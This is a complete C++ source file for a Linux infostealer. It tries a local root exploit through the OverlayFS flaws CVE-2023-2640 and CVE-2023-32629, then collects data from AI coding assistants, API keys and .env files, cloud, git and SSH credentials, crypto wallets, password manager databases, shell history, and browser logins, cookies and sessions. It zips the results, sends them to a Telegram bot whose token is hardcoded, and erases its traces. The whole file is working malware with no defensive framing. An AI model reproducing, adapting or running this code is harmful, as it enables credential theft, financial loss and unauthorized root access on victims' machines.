#include <iostream>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <vector>
#include <regex>
#include <cstring>
#include <sqlite3.h>
#include <curl/curl.h>
#include <zip.h>
#include <pwd.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

struct Config {
    std::string botToken = "8081686247:AAE15IJrN8cejZ3nA0NtsMH_raThnx5j5tA";
    std::string chatId = "8041986198";
};

std::string GetHomeDir() {
    const char* home = getenv("HOME");
    if (!home) {
        struct passwd* pw = getpwuid(getuid());
        home = pw->pw_dir;
    }
    return std::string(home);
}

// ============================================================================
// PRIVILEGE ESCALATION - CVE-2023-2640 & CVE-2023-32629 (OverlayFS)
// ============================================================================
bool AttemptPrivEsc() {
    if (geteuid() == 0) return true; // Already root
    
    std::cout << "[*] Attempting privilege escalation via OverlayFS exploit...\n";
    
    // Create exploit directory structure
    system("mkdir -p /tmp/exploit_ovl/upper /tmp/exploit_ovl/work /tmp/exploit_ovl/merged 2>/dev/null");
    
    // CVE-2023-2640: Ubuntu OverlayFS local privilege escalation
    const char* exploit = R"(
#!/bin/bash
unshare -rm sh -c "mkdir -p /tmp/exploit_ovl/l /tmp/exploit_ovl/u /tmp/exploit_ovl/w /tmp/exploit_ovl/m && \
mount -t overlay overlay -o lowerdir=/tmp/exploit_ovl/l,upperdir=/tmp/exploit_ovl/u,workdir=/tmp/exploit_ovl/w /tmp/exploit_ovl/m && \
touch /tmp/exploit_ovl/m/a && \
cp /bin/bash /tmp/exploit_ovl/l/bash && \
chown root:root /tmp/exploit_ovl/l/bash && \
chmod u+s /tmp/exploit_ovl/l/bash && \
umount /tmp/exploit_ovl/m"
/tmp/exploit_ovl/l/bash -p -c 'cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell'
)";
    
    std::ofstream exploitFile("/tmp/priv_esc.sh");
    exploitFile << exploit;
    exploitFile.close();
    
    chmod("/tmp/priv_esc.sh", 0755);
    system("/tmp/priv_esc.sh 2>/dev/null");
    
    // Check if we got root shell
    if (fs::exists("/tmp/rootshell")) {
        std::cout << "[+] Privilege escalation successful! Root shell at /tmp/rootshell\n";
        // Execute payload as root
        system("/tmp/rootshell -p -c 'id' 2>/dev/null");
        return true;
    }
    
    std::cout << "[-] Privilege escalation failed, continuing with current privileges\n";
    return false;
}

// ============================================================================
// SYSTEM PROFILING
// ============================================================================
std::string GetSystemInfo() {
    struct utsname uts;
    uname(&uts);
    
    std::ostringstream ss;
    ss << "=== SYSTEM PROFILE ===\n";
    ss << "Hostname: " << uts.nodename << "\n";
    ss << "Kernel: " << uts.sysname << " " << uts.release << "\n";
    ss << "Architecture: " << uts.machine << "\n";
    
    char username[256];
    getlogin_r(username, sizeof(username));
    ss << "User: " << username << " (UID: " << getuid() << ", EUID: " << geteuid() << ")\n";
    
    // Distribution info
    if (fs::exists("/etc/os-release")) {
        std::ifstream distro("/etc/os-release");
        std::string line;
        while (std::getline(distro, line)) {
            if (line.find("PRETTY_NAME") != std::string::npos) {
                ss << "Distribution: " << line.substr(line.find('=') + 2, line.length() - line.find('=') - 3) << "\n";
            }
        }
    }
    
    // Uptime
    std::ifstream uptime("/proc/uptime");
    double seconds;
    uptime >> seconds;
    ss << "Uptime: " << (int)(seconds / 3600) << " hours\n";
    
    // Network interfaces
    ss << "\n=== NETWORK ===\n";
    system("ip -4 addr show | grep inet >> /tmp/sys_profile.txt 2>/dev/null");
    std::ifstream netInfo("/tmp/sys_profile.txt");
    std::string netLine;
    while (std::getline(netInfo, netLine)) {
        ss << netLine << "\n";
    }
    fs::remove("/tmp/sys_profile.txt");
    
    return ss.str();
}

// ============================================================================
// AI ASSISTANT DATA HARVESTING
// ============================================================================
void HarvestAIAssistants(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    std::string aiDir = outDir + "/ai_assistants";
    fs::create_directories(aiDir);
    
    std::cout << "[*] Harvesting AI assistant data...\n";
    
    // Claude Code workspace data
    std::vector<std::string> claudeCodePaths = {
        homeDir + "/.claude-code",
        homeDir + "/.config/claude-code",
        homeDir + "/Library/Application Support/claude-code" // macOS fallback
    };
    
    for (const auto& path : claudeCodePaths) {
        if (fs::exists(path)) {
            std::string dest = aiDir + "/claude_code";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), path).string();
                    fs::copy(entry.path(), dest + "/" + relativePath, 
                            fs::copy_options::overwrite_existing | fs::copy_options::recursive);
                }
            }
            std::cout << "[+] Claude Code data captured\n";
        }
    }
    
    // OpenClaw assistant data
    std::vector<std::string> openclawPaths = {
        homeDir + "/.openclaw",
        homeDir + "/.config/openclaw"
    };
    
    for (const auto& path : openclawPaths) {
        if (fs::exists(path)) {
            std::string dest = aiDir + "/openclaw";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), path).string();
                    fs::copy(entry.path(), dest + "/" + relativePath,
                            fs::copy_options::overwrite_existing | fs::copy_options::recursive);
                }
            }
            std::cout << "[+] OpenClaw data captured\n";
        }
    }
    
    // Hermes agent configs
    std::vector<std::string> hermesPaths = {
        homeDir + "/.hermes",
        homeDir + "/.config/hermes-agent",
        homeDir + "/.hermes-agent"
    };
    
    for (const auto& path : hermesPaths) {
        if (fs::exists(path)) {
            std::string dest = aiDir + "/hermes";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), path).string();
                    fs::copy(entry.path(), dest + "/" + relativePath,
                            fs::copy_options::overwrite_existing | fs::copy_options::recursive);
                }
            }
            std::cout << "[+] Hermes agent data captured\n";
        }
    }
    
    // Continue.dev (VS Code extension)
    std::string continuePath = homeDir + "/.continue";
    if (fs::exists(continuePath)) {
        std::string dest = aiDir + "/continue";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(continuePath)) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Continue.dev data captured\n";
    }
    
    // Cursor editor
    std::string cursorPath = homeDir + "/.cursor";
    if (fs::exists(cursorPath)) {
        std::string dest = aiDir + "/cursor";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(cursorPath)) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Cursor editor data captured\n";
    }
    
    // Cody (Sourcegraph)
    std::string codyPath = homeDir + "/.config/cody";
    if (fs::exists(codyPath)) {
        std::string dest = aiDir + "/cody";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(codyPath)) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Cody data captured\n";
    }
    
    // GitHub Copilot
    std::string copilotPath = homeDir + "/.config/github-copilot";
    if (fs::exists(copilotPath)) {
        std::string dest = aiDir + "/copilot";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(copilotPath)) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] GitHub Copilot data captured\n";
    }
}

// ============================================================================
// API KEY & CREDENTIAL HARVESTING
// ============================================================================
void HarvestAPIKeys(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    std::string keysDir = outDir + "/api_keys";
    fs::create_directories(keysDir);
    
    std::cout << "[*] Harvesting API keys and credentials...\n";
    
    // Environment variables
    std::ofstream envFile(keysDir + "/environment_vars.txt");
    FILE* pipe = popen("env", "r");
    char buffer[512];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        std::string line(buffer);
        // Look for API keys, tokens, secrets
        if (line.find("KEY") != std::string::npos ||
            line.find("TOKEN") != std::string::npos ||
            line.find("SECRET") != std::string::npos ||
            line.find("PASSWORD") != std::string::npos ||
            line.find("API") != std::string::npos) {
            envFile << line;
        }
    }
    pclose(pipe);
    envFile.close();
    
    // .env files (recursively search common project directories)
    std::vector<std::string> searchDirs = {
        homeDir + "/Projects",
        homeDir + "/projects",
        homeDir + "/code",
        homeDir + "/Code",
        homeDir + "/dev",
        homeDir + "/Development",
        homeDir + "/Documents"
    };
    
    std::ofstream envFiles(keysDir + "/dotenv_files.txt");
    for (const auto& dir : searchDirs) {
        if (!fs::exists(dir)) continue;
        
        for (auto& entry : fs::recursive_directory_iterator(dir)) {
            if (entry.is_regular_file()) {
                std::string filename = entry.path().filename().string();
                if (filename == ".env" || filename == ".env.local" || 
                    filename == ".env.production" || filename == ".env.development") {
                    envFiles << "\n=== " << entry.path().string() << " ===\n";
                    std::ifstream file(entry.path());
                    std::string line;
                    while (std::getline(file, line)) {
                        envFiles << line << "\n";
                    }
                }
            }
        }
    }
    envFiles.close();
    
    // AWS credentials
    if (fs::exists(homeDir + "/.aws/credentials")) {
        fs::copy(homeDir + "/.aws/credentials", keysDir + "/aws_credentials.txt",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] AWS credentials captured\n";
    }
    
    // Google Cloud credentials
    if (fs::exists(homeDir + "/.config/gcloud")) {
        std::string dest = keysDir + "/gcloud";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(homeDir + "/.config/gcloud")) {
            if (entry.is_regular_file() && entry.path().extension() == ".json") {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Google Cloud credentials captured\n";
    }
    
    // Docker config (often contains registry credentials)
    if (fs::exists(homeDir + "/.docker/config.json")) {
        fs::copy(homeDir + "/.docker/config.json", keysDir + "/docker_config.json",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] Docker credentials captured\n";
    }
    
    // NPM auth token
    if (fs::exists(homeDir + "/.npmrc")) {
        fs::copy(homeDir + "/.npmrc", keysDir + "/npmrc.txt",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] NPM auth token captured\n";
    }
    
    // Git credentials
    if (fs::exists(homeDir + "/.git-credentials")) {
        fs::copy(homeDir + "/.git-credentials", keysDir + "/git_credentials.txt",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] Git credentials captured\n";
    }
    
    // GitHub CLI token
    if (fs::exists(homeDir + "/.config/gh/hosts.yml")) {
        fs::copy(homeDir + "/.config/gh/hosts.yml", keysDir + "/github_cli_token.yml",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] GitHub CLI token captured\n";
    }
}

// ============================================================================
// CRYPTOCURRENCY WALLET DETECTION
// ============================================================================
void HarvestCryptoWallets(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    std::string cryptoDir = outDir + "/crypto_wallets";
    fs::create_directories(cryptoDir);
    
    std::cout << "[*] Scanning for cryptocurrency wallets...\n";
    
    // Bitcoin Core
    if (fs::exists(homeDir + "/.bitcoin/wallet.dat")) {
        fs::copy(homeDir + "/.bitcoin/wallet.dat", cryptoDir + "/bitcoin_wallet.dat",
                fs::copy_options::overwrite_existing);
        std::cout << "[+] Bitcoin wallet found\n";
    }
    
    // Ethereum (various clients)
    std::vector<std::string> ethPaths = {
        homeDir + "/.ethereum/keystore",
        homeDir + "/.config/Ethereum/keystore"
    };
    for (const auto& path : ethPaths) {
        if (fs::exists(path)) {
            std::string dest = cryptoDir + "/ethereum_keystore";
            fs::create_directories(dest);
            for (auto& entry : fs::directory_iterator(path)) {
                if (entry.is_regular_file()) {
                    fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                            fs::copy_options::overwrite_existing);
                }
            }
            std::cout << "[+] Ethereum keystore found\n";
        }
    }
    
    // Monero
    if (fs::exists(homeDir + "/.bitmonero")) {
        std::string dest = cryptoDir + "/monero";
        fs::create_directories(dest);
        for (auto& entry : fs::directory_iterator(homeDir + "/.bitmonero")) {
            if (entry.is_regular_file()) {
                std::string filename = entry.path().filename().string();
                if (filename.find(".keys") != std::string::npos) {
                    fs::copy(entry.path(), dest + "/" + filename,
                            fs::copy_options::overwrite_existing);
                }
            }
        }
        std::cout << "[+] Monero wallet found\n";
    }
    
    // MetaMask (browser extension data already captured in browser harvest)
    // Electrum
    if (fs::exists(homeDir + "/.electrum/wallets")) {
        std::string dest = cryptoDir + "/electrum";
        fs::create_directories(dest);
        for (auto& entry : fs::directory_iterator(homeDir + "/.electrum/wallets")) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Electrum wallet found\n";
    }
}

// ============================================================================
// BROWSER DATA (Enhanced with session tokens & local storage)
// ============================================================================
void HarvestBrowserSessions(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    std::string sessionsDir = outDir + "/browser_sessions";
    fs::create_directories(sessionsDir);
    
    std::cout << "[*] Harvesting browser session data...\n";
    
    // Chrome/Chromium session storage & local storage
    std::vector<std::pair<std::string, std::string>> browsers = {
        {homeDir + "/.config/google-chrome", "chrome"},
        {homeDir + "/.config/chromium", "chromium"}
    };
    
    for (const auto& [path, name] : browsers) {
        if (!fs::exists(path)) continue;
        
        // Session Storage
        std::string sessionPath = path + "/Default/Session Storage";
        if (fs::exists(sessionPath)) {
            std::string dest = sessionsDir + "/" + name + "_session_storage";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(sessionPath)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), sessionPath).string();
                    fs::copy(entry.path(), dest + "/" + relativePath,
                            fs::copy_options::overwrite_existing);
                }
            }
        }
        
        // Local Storage
        std::string localPath = path + "/Default/Local Storage";
        if (fs::exists(localPath)) {
            std::string dest = sessionsDir + "/" + name + "_local_storage";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(localPath)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), localPath).string();
                    fs::copy(entry.path(), dest + "/" + relativePath,
                            fs::copy_options::overwrite_existing);
                }
            }
        }
        
        // IndexedDB (complex app data)
        std::string indexedPath = path + "/Default/IndexedDB";
        if (fs::exists(indexedPath)) {
            std::string dest = sessionsDir + "/" + name + "_indexeddb";
            fs::create_directories(dest);
            for (auto& entry : fs::recursive_directory_iterator(indexedPath)) {
                if (entry.is_regular_file()) {
                    std::string relativePath = fs::relative(entry.path(), indexedPath).string();
                    fs::copy(entry.path(), dest + "/" + relativePath,
                            fs::copy_options::overwrite_existing);
                }
            }
        }
    }
    
    std::cout << "[+] Browser session data captured\n";
}

void HarvestFirefox(const std::string& outDir) {
    std::string ffDir = GetHomeDir() + "/.mozilla/firefox";
    if (!fs::exists(ffDir)) return;
    
    std::cout << "[*] Harvesting Firefox data...\n";
    
    for (auto& profile : fs::directory_iterator(ffDir)) {
        if (!profile.is_directory()) continue;
        
        std::vector<std::string> targets = {
            "/logins.json",
            "/cookies.sqlite",
            "/places.sqlite",
            "/formhistory.sqlite",
            "/key4.db",
            "/sessionstore.jsonlz4", // Active session tabs
            "/sessionstore-backups"  // Session history
        };
        
        for (const auto& target : targets) {
            std::string srcPath = profile.path().string() + target;
            if (fs::exists(srcPath)) {
                if (fs::is_directory(srcPath)) {
                    std::string dest = outDir + "/ff_" + profile.path().filename().string() + target;
                    fs::create_directories(dest);
                    for (auto& entry : fs::recursive_directory_iterator(srcPath)) {
                        if (entry.is_regular_file()) {
                            fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                                    fs::copy_options::overwrite_existing);
                        }
                    }
                } else {
                    std::string destName = "ff_" + profile.path().filename().string() + target;
                    std::replace(destName.begin(), destName.end(), '/', '_');
                    fs::copy(srcPath, outDir + "/" + destName, fs::copy_options::overwrite_existing);
                }
            }
        }
    }
    
    std::cout << "[+] Firefox data captured\n";
}

void HarvestChrome(const std::string& browserPath, const std::string& outDir, const std::string& prefix) {
    std::string chromePath = GetHomeDir() + browserPath;
    if (!fs::exists(chromePath)) return;
    
    std::cout << "[*] Harvesting " << prefix << " data...\n";
    
    // Local State for decryption
    if (fs::exists(chromePath + "/Local State")) {
        fs::copy(chromePath + "/Local State", outDir + "/" + prefix + "_localstate.json",
                fs::copy_options::overwrite_existing);
    }
    
    // All profiles
    for (auto& entry : fs::directory_iterator(chromePath)) {
        if (!entry.is_directory()) continue;
        
        std::string profileName = entry.path().filename().string();
        if (profileName.find("Profile") == std::string::npos && profileName != "Default") continue;
        
        std::vector<std::string> targets = {
            "/Login Data",
            "/Cookies",
            "/Web Data",
            "/History",
            "/Bookmarks"
        };
        
        for (const auto& target : targets) {
            std::string srcPath = entry.path().string() + target;
            if (fs::exists(srcPath)) {
                std::string destName = prefix + "_" + profileName + target;
                std::replace(destName.begin(), destName.end(), ' ', '_');
                std::replace(destName.begin(), destName.end(), '/', '_');
                fs::copy(srcPath, outDir + "/" + destName, fs::copy_options::overwrite_existing);
            }
        }
    }
    
    std::cout << "[+] " << prefix << " data captured\n";
}

// ============================================================================
// SSH & SHELL DATA
// ============================================================================
void HarvestSSHKeys(const std::string& outDir) {
    std::string sshDir = GetHomeDir() + "/.ssh";
    if (!fs::exists(sshDir)) return;
    
    std::cout << "[*] Harvesting SSH keys...\n";
    
    std::string destDir = outDir + "/ssh_keys";
    fs::create_directories(destDir);
    
    for (auto& entry : fs::directory_iterator(sshDir)) {
        if (entry.is_regular_file()) {
            fs::copy(entry.path(), destDir + "/" + entry.path().filename().string(),
                    fs::copy_options::overwrite_existing);
        }
    }
    
    std::cout << "[+] SSH keys captured\n";
}

void HarvestShellHistory(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    
    std::cout << "[*] Harvesting shell history...\n";
    
    std::vector<std::string> histFiles = {
        homeDir + "/.bash_history",
        homeDir + "/.zsh_history",
        homeDir + "/.python_history",
        homeDir + "/.mysql_history",
        homeDir + "/.psql_history",
        homeDir + "/.redis_history"
    };
    
    for (const auto& histFile : histFiles) {
        if (fs::exists(histFile)) {
            fs::copy(histFile, outDir + "/" + fs::path(histFile).filename().string(),
                    fs::copy_options::overwrite_existing);
        }
    }
    
    std::cout << "[+] Shell history captured\n";
}

// ============================================================================
// PASSWORD MANAGER DETECTION
// ============================================================================
void HarvestPasswordManagers(const std::string& outDir) {
    std::string homeDir = GetHomeDir();
    std::string pmDir = outDir + "/password_managers";
    fs::create_directories(pmDir);
    
    std::cout << "[*] Scanning for password manager databases...\n";
    
    // KeePass
    std::vector<std::string> searchDirs = {homeDir, homeDir + "/Documents", homeDir + "/Downloads"};
    for (const auto& dir : searchDirs) {
        if (!fs::exists(dir)) continue;
        for (auto& entry : fs::recursive_directory_iterator(dir)) {
            if (entry.is_regular_file()) {
                std::string ext = entry.path().extension().string();
                if (ext == ".kdbx" || ext == ".kdb") {
                    fs::copy(entry.path(), pmDir + "/" + entry.path().filename().string(),
                            fs::copy_options::overwrite_existing);
                    std::cout << "[+] KeePass database found: " << entry.path().filename() << "\n";
                }
            }
        }
    }
    
    // 1Password (CLI data)
    if (fs::exists(homeDir + "/.op")) {
        std::string dest = pmDir + "/1password";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(homeDir + "/.op")) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] 1Password data found\n";
    }
    
    // Bitwarden
    if (fs::exists(homeDir + "/.config/Bitwarden")) {
        std::string dest = pmDir + "/bitwarden";
        fs::create_directories(dest);
        for (auto& entry : fs::recursive_directory_iterator(homeDir + "/.config/Bitwarden")) {
            if (entry.is_regular_file()) {
                fs::copy(entry.path(), dest + "/" + entry.path().filename().string(),
                        fs::copy_options::overwrite_existing);
            }
        }
        std::cout << "[+] Bitwarden data found\n";
    }
}

// ============================================================================
// PACKAGING & EXFILTRATION
// ============================================================================
void PackageExfil(const std::string& outDir, const std::string& zipPath, const std::string& sysInfo) {
    int err = 0;
    zip_t* archive = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!archive) {
        std::cerr << "[-] Failed to create archive\n";
        return;
    }
    
    // Add system info
    zip_source_t* infoSrc = zip_source_buffer(archive, sysInfo.c_str(), sysInfo.size(), 0);
    zip_file_add(archive, "SYSTEM_INFO.txt", infoSrc, ZIP_FL_ENC_UTF_8);
    
    // Add all harvested files
    for (auto& entry : fs::recursive_directory_iterator(outDir)) {
        if (entry.is_regular_file()) {
            std::string relativePath = fs::relative(entry.path(), outDir).string();
            zip_source_t* src = zip_source_file(archive, entry.path().c_str(), 0, 0);
            if (src) {
                zip_file_add(archive, relativePath.c_str(), src, ZIP_FL_OVERWRITE);
            }
        }
    }
    
    zip_close(archive);
    std::cout << "[+] Archive created: " << zipPath << "\n";
}

bool SendToTelegram(const std::string& filePath, const Config& cfg) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    std::string url = "https://api.telegram.org/bot" + cfg.botToken + "/sendDocument";
    
    curl_mime* mime = curl_mime_init(curl);
    curl_mimepart* part;
    
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "chat_id");
    curl_mime_data(part, cfg.chatId.c_str(), CURL_ZERO_TERMINATED);
    
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    std::string caption = "🔥 " + std::string(hostname);
    
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "caption");
    curl_mime_data(part, caption.c_str(), CURL_ZERO_TERMINATED);
    
    part = curl_mime_addpart(mime);
    curl_mime_name(part, "document");
    curl_mime_filedata(part, filePath.c_str());
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 120L);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_mime_free(mime);
    curl_easy_cleanup(curl);
    
    return (res == CURLE_OK);
}

// ============================================================================
// MAIN ORCHESTRATION
// ============================================================================
int main(int argc, char* argv[]) {
    Config cfg;
    
    std::cout << R"(
╔═══════════════════════════════════════════╗
║   ADVANCED LINUX DATA HARVESTER v2.0     ║
║   AI Assistants + CVEs + Full Spectrum   ║
╚═══════════════════════════════════════════╝
)" << "\n";
    
    // Attempt privilege escalation
    bool hasRoot = AttemptPrivEsc();
    
    pid_t pid = getpid();
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    
    std::string outDir = "/tmp/.hv_" + std::to_string(pid);
    std::string zipPath = "/tmp/" + std::string(hostname) + "_fullspectrum.zip";
    
    fs::create_directories(outDir);
    
    // System profiling
    std::string sysInfo = GetSystemInfo();
    
    // Core harvesting modules
    HarvestAIAssistants(outDir);
    HarvestAPIKeys(outDir);
    HarvestCryptoWallets(outDir);
    HarvestPasswordManagers(outDir);
    HarvestSSHKeys(outDir);
    HarvestShellHistory(outDir);
    HarvestFirefox(outDir);
    HarvestChrome("/.config/google-chrome", outDir, "chrome");
    HarvestChrome("/.config/chromium", outDir, "chromium");
    HarvestBrowserSessions(outDir);
    
    std::cout << "\n[*] Packaging full spectrum data...\n";
    PackageExfil(outDir, zipPath, sysInfo);
    
    // Get file size for display
    auto fileSize = fs::file_size(zipPath);
    std::cout << "[*] Package size: " << (fileSize / 1024.0 / 1024.0) << " MB\n";
    
    std::cout << "[*] Exfiltrating via Telegram...\n";
    if (SendToTelegram(zipPath, cfg)) {
        std::cout << "[+] ✓ Exfiltration successful\n";
        std::cout << "[*] Cleaning traces...\n";
        fs::remove(zipPath);
        fs::remove_all(outDir);
        if (fs::exists("/tmp/rootshell")) fs::remove("/tmp/rootshell");
        if (fs::exists("/tmp/priv_esc.sh")) fs::remove("/tmp/priv_esc.sh");
        std::cout << "[+] ✓ Clean exit\n";
    } else {
        std::cerr << "[-] ✗ Exfiltration failed\n";
        std::cerr << "[-] Package preserved at: " << zipPath << "\n";
    }
    
    return 0;
}
